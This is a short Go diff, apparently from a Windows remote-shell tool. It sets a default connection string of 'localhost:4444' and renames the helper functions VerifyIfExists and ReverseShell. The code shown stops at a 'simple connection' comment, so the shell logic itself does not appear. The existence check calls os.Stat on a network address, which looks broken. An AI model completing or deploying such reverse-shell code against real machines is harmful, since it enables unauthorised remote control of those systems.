@@ -9,11 +9,11 @@ import (
 	"github.com/gonutz/w32/v2"
 )
 
-var connectionStr string
+var connectionStr string = "localhost:4444"
 
 const buffSize = 128
 
-func verifyIfExists(connectionStr string) bool {
+func VerifyIfExists(connectionStr string) bool {
 	_, err := os.Stat(connectionStr)
 	if err != nil {
 		fmt.Println(err)
@@ -25,8 +25,8 @@ func verifyIfExists(connectionStr string) bool {
 	return true
 }
 
-func reverseShell() {
-	if !verifyIfExists(connectionStr) {
+func ReverseShell() {
+	if !VerifyIfExists(connectionStr) {
 		os.Exit(1)
 	}
 	// simple connection
